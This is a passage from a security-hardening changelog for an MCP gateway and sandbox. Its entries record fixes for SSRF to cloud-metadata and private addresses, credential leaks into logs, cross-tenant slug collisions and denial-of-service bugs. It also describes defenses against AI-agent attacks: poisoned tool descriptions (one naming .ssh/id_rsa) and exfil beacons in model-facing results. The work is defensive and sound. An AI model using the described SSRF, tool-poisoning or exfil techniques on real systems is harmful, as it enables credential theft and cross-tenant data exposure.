      LIVE VERIFIED (usage/schema) — CHG-0023 (2026-07-02): REDIS usage correct — mcp:scan_ver:* 72 keys
      (M-15 scan-config version cache-invalidation, string counters e.g. "99"); ratelimit:* 2 keys (S12
      active); mcp:toolcalls:* mechanism present (0 active = uncapped test keys, 60s TTL). POSTGRES correct
      at scale — mcp_connector_mcpevent 109,362 events / 3 orgs; compliance_tags populated (block=10,
      redact=265). RESTART-SAFETY graceful by design (Redis-unreachable -> pure-TTL, no crash; PG recording
      best-effort/non-blocking). REMAINING before [x]: actual restart DRILL (kill Redis/PG mid-load, verify
      recovery + no leakage during recovery) = item 18 chaos (UNSAFE on shared stack; needs dedicated host).
      CHG-0062 (2026-07-02, MEDIUM — Redis ATOMICITY bug found + fixed): the per-org burst/RPM limiter
      (rate_limit_enforcement.py enforce_org_burst_rpm, on the MCP path via _mcp_org_rate_limit_raw) did
      INCR then a SEPARATE `if current==1: EXPIRE` for both counters — non-atomic. On coroutine cancellation
      (client disconnect, routine under load) or crash between INCR and EXPIRE, the key was orphaned with NO
      TTL forever (time-bucketed → unbounded Redis memory leak under soak/chaos). Inconsistent with the
      already-atomic tool-call cap (CHG-0048 transaction=True + expire nx=True) and rate_limiter.py (Lua).
      FIX: both counters now INCR + EXPIRE NX in one MULTI/EXEC transaction — atomic + self-healing (EXPIRE
      NX every request re-sets a missing TTL; NX doesn't slide the window). Fail-open preserved. +5 tests;
      gate 5 atomic-ttl + 14 mcp_rate_limit + 1228 gateway passed, 0 failed. SIBLING (documented follow-up,
      NOT changed): leakage_detector.py:116-120 (sadd loop then separate expire) same class, milder.
      Evidence: mcp-parallel/findings/backstop-p11-ratelimit-atomic-ttl/finding.md. (Also advances item 9
      rate-limit hardening.)
      Evidence: mcp-parallel/findings/backstop-p11-pg-redis/pg_redis_evidence.txt.
      CHG-0048 (2026-07-02, MEDIUM — Redis correctness bug found + fixed): the per-key tool-call cap counter
      (_incr_tool_call_count) did count=INCR(rk); if count==1: EXPIRE(rk,60) — the window TTL was set ONLY on
      the FIRST increment, so a crash/dropped EXPIRE there left mcp:toolcalls:<key> with NO TTL forever (later
      calls have count>1 → skip EXPIRE), the counter never reset, and once count>mcp_max_tool_calls the key
      was 429'd on EVERY tool call PERMANENTLY until the Redis key was manually deleted. FIX: INCR +
      EXPIRE(nx=True) run ATOMICALLY in pipeline(transaction=True) (MULTI/EXEC) on every increment; NX
      (Redis 7.4) sets the TTL only when absent → fixed 60s window preserved (not sliding) + lost TTL healed
      next call. Fail-open unchanged. +5 tests via REAL fakeredis (atomic-set / fixed-window / TTL-heal /
      fail-open / no-key). Gate: 5 cap-ttl + 37 existing-cap + 1105 gateway passed. Evidence:
      mcp-parallel/findings/backstop-p11-toolcall-cap-ttl-race/finding.md. (This is a CODE correctness fix;
      the live kill-Redis-mid-load DRILL for item 11 [x] still needs a dedicated host = item 18 chaos.)
      CHG-0049 (2026-07-02, verification + regression guard): swept EVERY MCP Redis WRITE for the
      CHG-0048-class TTL-race/non-atomic bug. ALL CLEAN: _flow_save setex(600)+delete-on-pop (used-once
      CSRF/PKCE); _token_save setex with expiry-DERIVED ttl (max(expires_at-now+60,300), bumped to
      _TOKEN_DEFAULT_TTL when refresh_token present); tool-call cap atomic since CHG-0048; mcp:scan_ver:*
      read-only on the gateway. No new race. Pinned the untested OAuth token TTL-derivation with +4 tests
      (recording-Redis stub asserts the exact setex TTL). Documented non-issue: in-process _oauth_tokens
      fallback returning an expired record is BY DESIGN (get_stored_token re-checks expires_at;
      has_stored_token reports existence), size bounded by config cardinality not request volume. No
      production code change. Gate: 4 oauth-ttl + 1109 gateway passed. Evidence:
      mcp-parallel/findings/backstop-p11-redis-write-audit/finding.md.
- [ ] 12. gVisor + seccomp/no-new-privileges/cap_drop/egress-lockdown enforced.
      LIVE VERIFIED — CHG-0015 (2026-07-02): PRESENT live = cap_drop=ALL, no-new-privileges, per-org network
      (mcp_sandbox_net_<org> distinct per org — host-run shared-bridge fallback NOT active). GAPS:
      (a) gVisor UNMET INFRA PREREQ — `which runsc`=NOT installed, docker only offers runc; sandboxes run
      on runc (shared kernel). Code fail-closes if RUNTIME_REQUIRED=true (CHG-0001) so forcing it would KILL
      the sandboxes — gVisor must be INSTALLED on the deploy host first (infra task, not code). (b) egress:
      per-org networks internal=false (open outbound NAT) — no network-level egress default-deny. REMAINING
      before [x]: install gVisor + require runsc (verify Runtime=runsc live); network egress default-deny
      (per-org internal=true + broker-proxied allowlist, or iptables/eBPF). NOTE: risky to change live (would
      break the running stack). Evidence: mcp-parallel/findings/backstop-p12-isolation-posture/.
      CHG-0065 (2026-07-02, HIGH — gateway-side SSRF / egress-lockdown gap CLOSED in code): ext_mcp_proxy
      validated the forward target ONLY by hostname-STRING allowlist (_ALLOWED_MCP_DOMAINS), never
      resolving the IP — so an allowlisted domain resolving to an internal addr (DNS rebinding/hijack/
      misconfig) was forwarded to → caller reaches 169.254.169.254 (cloud-metadata IAM creds), loopback,
      or RFC-1918. The internal paths (internal_tools_call/discover) already guard via is_safe_outbound_url
      ("finding mcp#1"); ext-proxy was the omission. FIX (mcp_proxy.py): ext_mcp_proxy now calls
      is_safe_outbound_url(target_url) after building the URL → 400 on reject (getaddrinfo-resolve + block
      private/loopback/link-local/metadata, fail-closed; MCP_ALLOW_INTERNAL_HOSTS dev override). httpx
      follow_redirects=False → no redirect-SSRF. +3 tests (wiring block; REAL localhost→127.0.0.1→400 e2e;
      safe host allowed) + autouse fixture keeps existing redaction tests hermetic. Gate: 45 ext + 1245
      gateway passed, 0 failed. This is the GATEWAY-side egress control; the sandbox network-level
      egress-default-deny + gVisor-runsc residuals above remain INFRA (need the deploy host). Evidence:
      mcp-parallel/findings/backstop-p12-ext-proxy-ssrf/finding.md.
      CHG-0067 (2026-07-02, HIGH — SANDBOX-side SSRF gap CLOSED in code; the primary sandbox-routed path):
      the sandbox agent (services/mcp-broker/sandbox-image/agent/upstream_manager.py) _validate_upstream
      matched the upstream host STRING against allowed_hosts but NEVER resolved the IP — so an allowlisted
      host resolving to an internal addr (DNS rebinding, or a tenant registering an internal-resolving
      hostname) was dialed from inside the sandbox (internal=false/open-NAT → 169.254.169.254 metadata
      creds, loopback, RFC-1918). And the gateway does NOT is_safe_outbound_url the sandbox-routed upstream
      (only ext-proxy CHG-0065 + internal paths), so the sandbox allowlist-string check was the ONLY guard.
      FIX: new async _assert_upstream_not_ssrf() resolves via the loop's non-blocking getaddrinfo + rejects
      -32002 if any resolved IP is metadata/private/loopback/link-local/reserved; fail-closed;
      MCP_AGENT_ALLOW_INTERNAL_HOSTS dev bypass; called in _get_session before any connection. +2 tests
      (localhost→127.0.0.1→-32002; public IP allowed). Gate: 13 passed (-k "not websocket"; ws tests hang
      pre-existingly). RESIDUAL: network egress-lockdown (sandbox internal=true/iptables) is still the INFRA
      fix for full default-deny; a gateway-side guard on the sandbox-routed upstream would add a 2nd layer.
      Evidence: mcp-parallel/findings/backstop-p12-sandbox-ssrf/finding.md.
      CHG-0035 (2026-07-02, verification): CODE-level sandbox security audited CLEAN (the runc/egress gaps above
      are the only residuals, and both are INFRA). docker_manager: no-new-privileges + DEFAULT seccomp (code
      explicitly does NOT pass seccomp=unconfined) + cap_drop=ALL + read_only rootfs + memswap_limit=mem_limit
      (swap DISABLED) + pids/mem/cpu limits + tmpfs-only-for-caches. Sandbox AGENT egress hygiene also clean:
      HTTP follow_redirects=False + no verify=False anywhere (TLS verify default-on) + timeouts; WS ws/wss-only
      + default verifying SSL context. And the cross-tenant multi-org harness (scripts/mcp_multi_org_harness.py,
      item 19) oracle is SOUND: byte-level canary cross-target detection + JSON-RPC id round-trip + fail-closed
      negative matrix (any non-401/403 on a cross-tenant call = breach). Evidence:
      mcp-parallel/findings/backstop-p12b-sandbox-egress-hygiene/audit.md.

## G4 — Production hardening (Phase 3)
- [ ] 13. Monitoring + metrics + tracing wired; backup; auto-recovery (sandbox/broker/Redis/PG self-heal).
      LIVE VERIFIED (partial) — CHG-0020 (2026-07-02): probed the running stack. METRICS WIRED (gateway
      /metrics 401 scraper-key-gated, METRICS_ALLOW_OPEN=false=secured; telemetry-drain thread). HEALTH
      WIRED (gateway /health + /v1/mcp/health 200; control /api/health/ 200; broker :8311 /health 200).
      AUTO-RECOVERY: docker healthchecks on broker/control/postgres/redis (all healthy -> auto-restart on
      unhealthy) + sandbox reaper/reconcile. GAPS before [x]: (1) distributed TRACING (OTEL/Jaeger) NOT
      configured (metrics/telemetry present, but no request-level tracing); (2) gateway container has NO
      docker healthcheck (health=none -> not auto-restarted); (3) backup (PG/Redis) NOT verified. Evidence:
      mcp-parallel/findings/backstop-p13-observability/observability_evidence.txt.
      CHG-0027 (2026-07-02): gap (2) CLOSED. Added a docker healthcheck + restart to the gateway service (the
      ONLY core service with neither). Probes the auth-exempt /health (200 ok / 503 on signing misconfig;
      python urllib, interval 15s/timeout 6s/retries 5/start_period 60s) on BOTH docker-compose.yml (base:
      healthcheck + restart: unless-stopped) and docker-compose.prod.yml (prod: healthcheck; restart via
      anchor). Config-only — running container NOT recreated; takes effect next `docker compose up`. VERIFY:
      `docker compose -f docker-compose.yml -f docker-compose.override.yml config` renders gateway.healthcheck
      + restart=unless-stopped; base+prod merged config also valid. STILL OPEN (item stays [ ]): (1) OTEL/
      Jaeger distributed tracing; (3) PG/Redis backup verification; optional peer service_healthy upgrade.
      CHG-0050 (2026-07-02, LOW-MED — code-level tracing gap): _record_gateway_event defaults request_id to
      a throwaway mcp-<ms> timestamp. The bare REST route org_mcp_tool_call recorded ALL audit events with NO
      request_id; org_mcp_jsonrpc used the repeatable JSON-RPC id only on main sites; NEITHER honored an
      inbound X-Request-ID — so a tool call's decisions weren't correlatable across the audit trail or
      gateway->broker->sandbox. FIX: new _mcp_request_correlation_id(request, msg_id) prefers X-Request-ID
      (bounded 200 chars), then JSON-RPC id, else "". Threaded into ALL 5 REST audit events (was zero); the
      jsonrpc _req_id now uses it. +6 tests (integration: REST audit carries the header via patched
      _record_gateway_event; unit: prefer/fallback/empty/bound-hostile/no-.headers). Gate: 33 bare-proxy +
      1115 gateway passed. Evidence: mcp-parallel/findings/backstop-p13-request-correlation-id/finding.md.
      STILL OPEN (item 13 [ ]): thread _req_id into jsonrpc early authz sites + internal_tools_call; propagate
      into broker_send_rpc for cross-service tracing; OTEL/Jaeger + PG/Redis backup remain INFRA.
      CHG-0051 (2026-07-02, completes the CHG-0050 broker-propagation follow-up): broker_send_rpc sent NO
      correlation id to the broker, so the trace ended at the gateway boundary. FIX (out-of-band X-Request-ID
      header, no JSON-RPC schema change): _request_with_503_retry gains extra_headers (merged w/ broker auth
      headers, built once + reused across 503 retries); broker_send_rpc gains correlation_id → sends
      X-Request-ID when set (no header when unset); _adapter_forward gains correlation_id (default "") →
      passes it through; org_mcp_jsonrpc tool-call site passes correlation_id=_req_id. Remote-transport tool
      calls now carry the id to broker+sandbox. +2 tests (header sent when set / absent when unset). Gate: 13
      sandbox-client + 1117 gateway passed. Evidence: mcp-parallel/findings/backstop-p13-broker-correlation-propagation/finding.md.
      STILL OPEN (item 13 [ ]): stdio branch (send_jsonrpc); tools/list + internal_tools_call + early authz
      sites; broker/sandbox should LOG the received X-Request-ID; OTEL/Jaeger + PG/Redis backup remain INFRA.
      CHG-0052 (2026-07-02, completes CHG-0051): the broker RPC route neither read nor logged the propagated
      X-Request-ID (the broker RPC path had NO per-call logging at all). FIX (services/mcp-broker/src/sandbox/
      routes.py): added logger; both RPC routes capture x_request_id=Header(alias=X-Request-ID) →
      _forward_sandbox_rpc logs ONE line at the top (before docker resolution, so failed 503s trace too) with
      SAFE metadata ONLY (org/server/transport/method/jsonrpc_id/request_id — NEVER params/args/env/upstream,
      which can carry PII/secrets; mirrors CHG-0041); "-" when no header. Trace chain now: gateway audit
      (CHG-0050) → X-Request-ID (CHG-0051) → broker log (CHG-0052). +2 tests (TestClient: header logged / "-"
      when absent / no params in logs; force clean 503 via cached_docker_ok=False). Gate: 106 broker passed.
      Evidence: mcp-parallel/findings/backstop-p13-broker-logs-correlation-id/finding.md. STILL OPEN (item 13
      [ ]): forward X-Request-ID to the sandbox AGENT + agent-log (last hop); gateway stdio/tools-list/internal/
      early-authz sites; OTEL/Jaeger + PG/Redis backup remain INFRA.
      CHG-0053 (2026-07-02, item 13/1.4 — sandbox-agent leak-to-logs audit + fix): extended the CHG-0041
      gateway-logging audit to the broker + sandbox AGENT. AUDIT: tool-call RESULTS/params are NEVER logged
      (1.4-critical property holds); only the initialize result (capabilities, json-escaped+truncated) +
      metadata logged. GAP: stdio_manager.py:360 logged command+args verbatim — env is never logged, but a
      credential passed as a stdio ARG (--token XYZ / --api-key=XYZ) would land in operator logs plaintext.
      FIX: new _safe_args_for_log() masks secret-flag VALUES (token/key/secret/password/passwd/auth/credential/
      apikey); standalone URLs/pkg-specs untouched. +5 tests. Gate: 31 stdio-pkg + 106 broker passed (no test
      depends on the log format). Evidence: mcp-parallel/findings/backstop-p13-broker-agent-log-hygiene/finding.md.
      FOLLOW-UP: URL-embedded creds in a standalone arg (separate vector, not masked by the flag heuristic).
      -> CLOSED by CHG-0107.
      CHG-0107 (2026-07-03, MEDIUM 1.4 credential leak to OPERATOR LOGS, both consumers — CLOSES the CHG-0053
      follow-up): the stdio-spawn log line logged args carrying secrets. (a) CHG-0053 masked secret-FLAG values
      (--token X) but ONLY on the sandbox agent; a credential embedded in a URL passed as a STANDALONE arg
      (postgres://u:pw@h/db, https://x-access-token:ghp_..@github, https://h/mcp?api_key=..&token=..) egressed RAW.
      (b) the GATEWAY adapter (mcp_stdio_adapter.py:426) logged args with NO masking at ALL. Byte-verified pre-fix:
      all four URL-cred forms + --token XYZ egressed verbatim (gateway path); the four URL forms egressed (sandbox
      path). FIX: ONE hardened _safe_args_for_log + _redact_url_creds now live in shared/ai_mesh_shared/
      mcp_stdio_common.py (imported by BOTH the gateway adapter and the vendored sandbox agent — Dockerfile COPYs
      the shared file) — masks secret-flag values AND the WHOLE URL userinfo (scheme://***@host) + secret-named
      query-param values (?api_key=***&token=***&page=2, non-secret preserved), for standalone args AND non-secret
      --flag=URL inline values; fail-safe (never raises). The sandbox agent's local CHG-0053 copy was DEDUPED into
      shared. TESTS: shared +12 (test_stdio_common.py), sandbox agent +2, gateway +1. Gate: 12 shared + 120 broker
      + 33 sandbox-agent + 1663 gateway passed, 0 failed. Byte-level: postgres://admin:S3cr3tPass@... ->
      postgres://***@...; ?api_key=AKIA..&token=abc&page=2 -> ?api_key=***&token=***&page=2; benign URL/pkgspec/flag
      controls correct. Independent oracle (aidefence_scan): piiFound true raw / false masked (blind to AWS-key/URL-
      query class -> byte-level authoritative; masking uses urlsplit, independent of the detection regexes).
      Evidence mcp-parallel/findings/backstop-p13-stdio-arg-url-cred-log-leak/finding.md. One helper, both deployables.
      CHG-0108 (2026-07-03, MEDIUM-HIGH 1.4 leak + tool-poisoning — internal tool-DISCOVERY route returned upstream
      tools/list metadata UNSCANNED): internal_discover_tools (the X-Gateway-Internal-Key route the backend uses to
      SYNC an MCP server's tool catalog) returned the upstream tools/list RAW on BOTH paths (sandbox _adapter_forward;
      direct-httpx json.loads/tools_resp.json). Tool descriptions/names/inputSchema come LIVE from an untrusted
      upstream, synced into the catalog + shown to the model -> a secret/PII/internal-IP (or CHG-0076 encoded-exfil)
      in a description egressed to backend/LLM unredacted, while org_mcp_jsonrpc (CHG-0077/0092), REST (CHG-0079), and
      the ext-proxy all scan tool metadata. Byte-verified pre-fix: desc AKIAIOSFODNN7EXAMPLE + bob.jones@corp.example
      + 10.9.8.7 egressed all three raw on both paths. FIX (mcp_proxy.py): new _scan_internal_tools_list scans the
      discovered payload — tools-shaped -> _scanned_tools_list_response (mask maskable / fail-closed BLOCK poisoned/
      unmaskable / audit); bare error envelope -> _scan_tool_result_floor (CHG-0092 parity) + audit; wired into all 3
      return points; fetches enabled_info (respects monitor override); actor=None (descriptions not actor-scoped). NEW
      TEST test_mcp_internal_discover_tools_scan.py (5). Gate: 5 + 1668 gateway passed 0 failed; broker 120
      (unaffected). Byte-level: Contact bob.jones@corp.example key AKIAIOSFODNN7EXAMPLE host 10.9.8.7 -> b***@c***.
      example key AKIA****MPLE host [INTERNAL_IPV4_REDACTED]; poisoned .ssh/id_rsa desc -> tools/list withheld. Oracle
      (aidefence): has_pii true raw / false masked. Evidence mcp-parallel/findings/backstop-p-internal-discover-tools-
      unscanned/finding.md. tools/list scanning now at FULL PARITY across org-jsonrpc / REST / ext-proxy / internal-discovery.
      CHG-0109 (2026-07-03, LOW-MED audit-completeness — tag-inputs->audit): INBOUND arg redaction was not audited on
      the internal / bare-REST / ext paths. When tool ARGUMENTS carry PII/IP the gateway MASKS (scan_action=redact,
      not a hard block) before forwarding, the main org_mcp_jsonrpc path folds it into its per-call _was_redacted
      event, but internal_tools_call / org_mcp_tool_call / ext_mcp_proxy swapped the masked args in SILENTLY (no
      _record_gateway_event) -> the INPUT redaction was invisible to audit/SIEM, asymmetric with the block branch
      (pii_blocked_inbound) + result-side redact audits (CHG-0081/0106). Byte-proven reachable: a redact-configured
      server masked bob.jones@corp.example -> b***@c***.example in the forwarded args, ZERO events recorded. FIX
      (mcp_proxy.py): the 3 paths now record decision=redact reason=pii_redacted_inbound (inbound tags+findings) on
      inbound redaction (not blocked); benign -> nothing (no noise); credential -> still block-not-redact. Ext edit
      = defense-in-depth parity (ext scans args enabled_info=None -> tag -> no inbound redaction under current
      config). NEW TEST test_mcp_inbound_redact_audit.py (5). Gate: 5 + 1673 gateway passed 0 failed; broker 120
      (unaffected). NOT a leak (egress already redacted) — audit-visibility fix; oracle (aidefence): forwarded
      masked args has_pii false. Evidence mcp-parallel/findings/backstop-p-inbound-redact-audit/finding.md. Inbound-
      redact audit now at parity across all 4 tool-call paths (main/internal/REST/ext).
      CHG-0110 (2026-07-03, LOW-MED least-privilege/context-minimization): ext-proxy egress leaked client IP /
      internal topology / org slug to third-party servers. _ext_proxy_forward_headers (transparent EXTERNAL proxy
      outbound header set) is a DENYLIST — stripped credentials (authorization/cookie/x-api-key CHG-0033) + x-gateway-*
      + hop-by-hop, but forwarded EVERYTHING else. So x-forwarded-for/x-real-ip (caller real IP + internal IP),
      x-forwarded-host/forwarded/via (internal host + proxy chain), referer (internal URL + ORG/TENANT slug e.g.
      https://gw.internal/org/demo/chat) leaked to the untrusted third party. Byte-verified pre-fix: 203.0.113.9 +
      10.0.0.2 + gw.internal + org/demo all egressed. FIX (mcp_proxy.py): also drop _EXT_ROUTING_HEADERS (x-real-ip,
      forwarded, via, referer, referrer) + any x-forwarded-* (prefix); third party now sees only content-type/accept/
      mcp-session-id/mcp-protocol-version/user-agent + gateway's own upstream OAuth. NEW TEST (+1 in
      test_mcp_bare_proxy_scan.py). Gate: 3 forward_headers + 1682 gateway passed 0 failed; broker 120 (unaffected).
      NOT a credential leak (creds already stripped) -> privacy/topology/tenant-identity minimization; aidefence blind
      to IP/header class -> byte-level header-absence authoritative. Evidence mcp-parallel/findings/backstop-p-ext-
      egress-header-minimization/finding.md.
      CHG-0111 (2026-07-03, HIGH cross-tenant isolation break — broker org_slug sanitize-collision): the broker key
      (X-MCP-Broker-Key) is a SHARED secret (not per-org), so the path org_slug is the SOLE tenant selector for
      sandbox routing. DockerManager LOSSILY sanitizes it for the container name (re.sub([^a-zA-Z0-9_.-] -> "-").
      strip("-") or "default") and find_container matches by NAME first; NO route validated the slug. So distinct
      slugs COLLIDE onto one container: acme/prod == acme-prod; -acme == acme- == acme; teñant == te-ant; empty/all-
      invalid -> default. A colliding slug on /rpc runs org B's call in org A's sandbox; DELETE destroys the wrong
      org's container; /status leaks another org's processes. FIX (services/mcp-broker/src/sandbox/routes.py): new
      _require_canonical_org_slug fails CLOSED (400) on any slug the sanitizer would alter (accept only sanitize(slug)
      ==slug, non-empty, <=64, no leading/trailing -); applied to /ensure /rpc /stdio/rpc /status DELETE. Encoded-slash
      slugs also 404 at routing. NEW TEST test_sandbox_org_slug_validation.py (26). Gate: 26 + 146 broker passed;
      gateway unaffected (posts over HTTP, supplies validated slugs). Oracle N/A (routing/isolation fix, no PII-text
      delta; collision demo + route-level 400s authoritative). Evidence mcp-parallel/findings/backstop-p-broker-org-
      slug-collision/finding.md.
      CHG-0112 (2026-07-03, MEDIUM-HIGH cross-tenant residual — completes CHG-0111): broker by-name container lookup
      didn't verify the org label. find_container calls get_container_by_name FIRST (pure client.containers.get(
      container_name(slug)), NO label check). The name comes from a LOSSY sanitizer, so a name match isn't proof of
      tenancy: a legacy/renamed container owning the name but with a DIFFERENT LABEL_ORG_SLUG serves the WRONG org
      (e.g. a pre-CHG-0111 container for colliding slug acme/prod still owning ...-acme-prod, matched for canonical
      acme-prod). FIX (services/mcp-broker/src/sandbox/docker_manager.py): get_container_by_name now verifies
      LABEL_ORG_SLUG==slug AND LABEL_ROLE==mcp-sandbox (via new _container_labels helper); mismatch -> log + None
      (fail-closed) so find_container falls through to the authoritative label filter. Org LABEL is now the tenant
      key; name is only an optimization. +4 tests; 2 broker mocks made realistic (real containers always carry these
      labels). Gate: 4 + 150 broker passed; gateway unaffected. Oracle N/A (routing/isolation fix, no PII-text
      delta). Evidence mcp-parallel/findings/backstop-p-broker-name-label-verify/finding.md.
      CHG-0113 (2026-07-03, LOW-MED cross-tenant residual — completes CHG-0112 for volumes): broker destroy removed
      the org VOLUME by name without label verification. CHG-0112 label-verified the CONTAINER, but destroy still
      removed the auth volume (/data/mcp-auth) purely by volume_name(slug) (lossy) with NO label check; the volume was
      auto-created UNLABELED. A legacy/reused volume owning the canonical name but belonging to a DIFFERENT org (pre-
      CHG-0111 colliding slug) would be DESTROYED for the wrong org. FIX (docker_manager.py): (1) _ensure_volume
      explicitly creates the volume WITH labels(org_slug) before the container run (idempotent, best-effort); (2)
      destroy reads _volume_labels + REFUSES to remove a volume whose LABEL_ORG_SLUG differs from the requested org
      (fail-closed); unlabeled-legacy/same-org volumes still removed. Org LABEL is now the tenant key for the volume
      too. +5 tests. Gate: 8 volume + 155 broker passed; gateway unaffected. Oracle N/A. Evidence mcp-parallel/
      findings/backstop-p-broker-volume-label-verify/finding.md.
      AUDIT (this iteration, verification-only — no code change): re-probed the other tenant-selector surfaces, all
      ALREADY hardened — gateway OAuth token store (org-prefixed clean-slug key; flow/callback/status org-scoped, one-
      time state, PKCE, token from trusted flow record, callback XSS-escaped); control-plane _request_org (tenant from
      authed profile OR secret-validated gateway-internal X-Org-Slug, client org NOT honored; MCPEvent sanitizes all
      channels); tool-call cap per-key. FLAGGED for a FUTURE GATED iteration (not reachable today + control-plane test
      env unavailable here — no venv, django/fakeredis not importable): _gateway_request_org should self-verify the
      internal secret before honoring X-Org-Slug (defense-in-depth vs a future weaker-permission view).
      CHG-0114 (2026-07-03, MEDIUM fail-open DoS — self-correction of backstop CHG-0097): deep-nested JSON result
      crashed _neutralize_exfil_deep. The render-leak neutralizer parses the WHOLE result JSON + walks it per string
      leaf, but _walk had NO depth bound. CPython json.loads PARSES thousands-deep JSON that the Python _walk then
      can't traverse (recursion limit ~1000) -> RecursionError; the try/except covered only json.loads, so it
      propagated to tier1 which SWALLOWED it, SILENTLY SKIPPING exfil-beacon/markdown-split neutralization for that
      result (fail-open of CHG-0096-0099) + a per-call stack-exhaustion vector. Byte-verified: _neutralize_exfil_deep(
      json.dumps(nested(6000))) raised RecursionError. FIX (mcp_scan_orchestrator.py): _walk depth-bounded
      (_MAX_EXFIL_WALK_DEPTH=200, env MCP_EXFIL_WALK_MAX_DEPTH) + walk/dumps wrapped in try/except -> string-level
      neutralize fallback. Deep results no longer crash NOR disable the defense; realistic shallow beacons still
      defanged. +6 tests. Gate: 33 exfil + 1699 gateway passed 0 failed; broker unaffected. Oracle N/A (DoS + beacon-
      defang; byte assertions authoritative). RESIDUAL: beacon nested past the 200 cap not per-leaf-defanged (not a
      realistic client auto-render vector). Evidence mcp-parallel/findings/backstop-p-exfil-deep-nest-dos/finding.md.
      CHG-0115 (2026-07-03, LOW-MED resource-bomb containment + monitor fix): proactive nesting-depth cap on tool
      RESULTS. A result STRUCTURE nested thousands deep makes the recursive scan hit Python's recursion limit (~1000)
      -> RecursionError; the floor's except already fail-CLOSED (safe, no leak) but (a) relied on catching a fragile
      mid-scan RecursionError (generic SCAN_ERROR) and (b) under a per-tool "monitor" action (observe-only, must NEVER
      block) the scan still ran, RecursionError'd, fail-closed -> a WRONGFUL block violating monitor. FIX
      (mcp_proxy.py): new ITERATIVE _exceeds_nesting_depth (own stack, can't be recursion-DoS'd) runs BEFORE the scan;
      past _MCP_MAX_RESULT_DEPTH (500, env MCP_MAX_RESULT_DEPTH) branches on action -> real action: fail-closed
      RESOURCE_LIMIT + result_too_deeply_nested; monitor: forward UNSCANNED (never block, monitor_scan_skipped). Deep
      results can't crash the scan, get a clear reason, monitor stays observe-only. +4 tests. Gate: 11 block-count-cap
      + 1703 gateway passed 0 failed; broker unaffected. Oracle N/A (DoS containment, no PII-text delta). Extends
      CHG-0104 / complements CHG-0114. Evidence mcp-parallel/findings/backstop-p-result-depth-cap/finding.md.
      CHG-0116 (2026-07-03, LOW-MED resource-bomb + monitor fix — INPUT-side twin of CHG-0115): proactive depth cap on
      inbound tool ARGS. CHG-0115 capped the RESULT floor; _scan_tool_args_block (scans attacker-controlled tool-call
      ARGUMENTS) had none -> deep args RecursionError'd the input scan (caught as generic arg_scan_error; under a per-
      tool "monitor" action -> wrongful fail-closed block violating observe-only). FIX (mcp_proxy.py):
      _scan_tool_args_block runs the same iterative _exceeds_nesting_depth BEFORE the scan; past _MCP_MAX_ARG_DEPTH
      (defaults to _MCP_MAX_RESULT_DEPTH=500, env MCP_MAX_ARG_DEPTH) branches on action -> real action: fail-closed
      RESOURCE_LIMIT + args_too_deeply_nested; monitor: forward UNCHANGED (never block, monitor_scan_skipped).
      Credential force-block on shallow args unchanged. +3 tests. Gate: 14 resource-limit + 1706 gateway passed 0
      failed; broker unaffected. Oracle N/A (DoS containment). Input-side twin of CHG-0115; parity with CHG-0104.
      Evidence mcp-parallel/findings/backstop-p-args-depth-cap/finding.md.
      CHG-0117 (2026-07-03, MEDIUM fail-open DoS — infinite-stream resource bomb): the ext-proxy NON-finite SSE
      stream_gen (CHG-0098, server notifications/*subscribe) caps each EVENT at 1MB + never buffers the whole stream,
      but had NO cap on total bytes/events/duration -> an untrusted allowlisted upstream can stream an INFINITE
      sequence of small (<1MB) events forever (holds the connection, burns CPU scanning each, egresses unbounded;
      httpx per-read timeout won't stop a slow-steady infinite stream). FIX (mcp_proxy.py): stream_gen tracks
      total_bytes + event_count and, past _MCP_SSE_STREAM_MAX_BYTES (100MB, env MCP_SSE_STREAM_MAX_BYTES) or
      _MCP_SSE_STREAM_MAX_EVENTS (100000, env MCP_SSE_STREAM_MAX_EVENTS), CLOSES the stream fail-closed (yields ':
      [stream closed: resource limit]', audits sse_stream_limit_exceeded, returns -> finally aclose()s resp+client).
      Generous defaults >> realistic feed; env-tunable. +3 tests. Gate: 8 ext-sse + 1709 gateway passed 0 failed;
      broker unaffected. Oracle N/A (DoS containment). Streaming-path twin of CHG-0104/0115/0116; extends CHG-0098.
      Evidence mcp-parallel/findings/backstop-p-sse-stream-total-bound/finding.md.
      CHG-0118 (2026-07-03, MEDIUM 1.4 leak + tool-poisoning): ext-proxy forwarded completion/complete +
      resources/templates/list results UNSCANNED. ext_mcp_proxy scans a result only when its method is in
      _EXT_FINITE_RESULT_METHODS; two finite server-controlled model/user-facing methods were MISSING -> raw:
      completion/complete (result.completion.values[] autocompletion strings shown to user/model) + resources/
      templates/list (result.resourceTemplates[].{name,description,uriTemplate} metadata, model-facing like
      resources/list which IS scanned). Same class as tools/list (CHG-0077) / initialize (CHG-0080). Byte-verified:
      completion.values with AKIAIOSFODNN7EXAMPLE + bob@corp.example and a template description with AKIA.. + 10.9.8.7
      egressed raw. FIX (mcp_proxy.py): added both methods to _EXT_FINITE_RESULT_METHODS -> buffered + scanned via the
      result floor on JSON + SSE branches; benign preserved. +3 tests. Gate: 3 + 55 ext-proxy + 1713 gateway passed 0
      failed; broker unaffected. Byte-level: completion.values [key AKIA****MPLE, contact b***@c***.example]; template
      desc AKIA****MPLE host [INTERNAL_IPV4_REDACTED]. Oracle (aidefence): has_pii true raw / false masked. Extends
      CHG-0077/0080. Evidence mcp-parallel/findings/backstop-p-ext-completion-templates-scan/finding.md.
      CHG-0119 (2026-07-03, MEDIUM 1.4 credential-egress — input-side twin of CHG-0118): ext-proxy did not credential-
      scan completion/complete CLIENT INPUT before egress. CHG-0118 scanned the completion RESULT, but its input was
      forwarded raw: the ext inbound credential-scan (_EXT_ARG_SCAN_METHODS = tools/call, prompts/get) only inspects
      params.arguments, and completion/complete's input has a DIFFERENT shape -> params.argument.value (user's partial
      typed value) + params.context.arguments -> never scanned. A credential in that input egressed to the untrusted
      external server. FIX (mcp_proxy.py): extract argument.value + context.arguments into a synthetic dict + run
      through _scan_tool_args_block (E12 credential force-block) BEFORE egress -> credential BLOCKED (never sent,
      client.send not awaited, audited credential_blocked_inbound); inbound redaction written back + audited; benign
      forwarded. Input + output of completion/complete now both scanned (parity with tools/call). +2 tests. Gate: 4
      completion + 1720 gateway passed 0 failed; broker unaffected. Byte-level: argument.value 'my key
      AKIAIOSFODNN7EXAMPLE' -> blocked, secret never reaches client.send. Oracle N/A (aidefence blind to AWS-key
      class). Extends CHG-0041/0109. Evidence mcp-parallel/findings/backstop-p-ext-completion-input-scan/finding.md.
      CHG-0120 (2026-07-03, LOW tracing completeness — completes CHG-0050/0051/0052 for the internal routes): internal
      (chat-pipeline) routes dropped the X-Request-ID correlation id. CHG-0050/0051 propagate X-Request-ID into every
